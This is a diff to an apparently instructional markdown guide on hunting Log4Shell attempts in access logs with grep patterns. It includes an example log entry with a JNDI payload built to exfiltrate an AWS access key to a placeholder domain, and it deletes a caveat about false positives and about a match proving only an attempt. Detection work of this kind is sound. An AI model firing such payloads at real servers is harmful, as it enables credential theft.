@@ -117,8 +117,6 @@ grep -iE 'jndi|\$\{(::-|lower:|upper:|env:|sys:|base64:)|%24%7b|%2524%257b' acce
 grep -i 'jndi' access.log | awk -F'"' '{print "REFERER:", $4, "| USER-AGENT:", $6}'
 ```
 
-> **Note:** the broad search (3) can produce some false positives, so review the matches. Also, a WAF or log search finds the **attempt**. It doesn't prove the server was exploited.
-
 ### Example nginx log entry (from the course)
 ```
 10.0.2.50 - - [13/Jul/2023:12:45:18 +0000] "GET /search.php?q=*&jndi=ldap%3A%2F%2F${env:AWS_ACCESS_KEY_ID}.exampledomain.com%2Fa HTTP/1.1" 200 815 "-" "Mozilla/5.0 ..."
